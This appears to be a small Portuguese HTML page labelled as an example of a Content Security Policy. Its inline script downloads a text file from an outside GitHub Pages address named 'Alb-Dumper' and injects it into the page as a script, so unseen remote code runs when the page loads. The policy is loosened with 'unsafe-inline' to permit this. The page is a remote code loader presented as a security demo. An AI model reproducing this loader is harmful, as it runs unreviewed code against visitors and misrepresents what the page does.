<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Exemplo com CSP</title>

  <!-- Content Security Policy -->
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self' https://realkooper77.github.io; script-src 'self' 'unsafe-inline' https://realkooper77.github.io;">

  <script>
    var scriptUrl = 'https://realkooper77.github.io/Alb-Dumper//index.txt';

    fetch(scriptUrl)
      .then(response => response.text())
      .then(script => {
        var scriptElement = document.createElement('script');
        scriptElement.innerHTML = script;
        document.head.appendChild(scriptElement);
      })
      .catch(error => {
        console.error('Ocorreu um erro ao carregar o script:', error);
      });
  </script>
</head>
<body>
  <h1>Exemplo de implementação de CSP</h1>
</body>
</html>
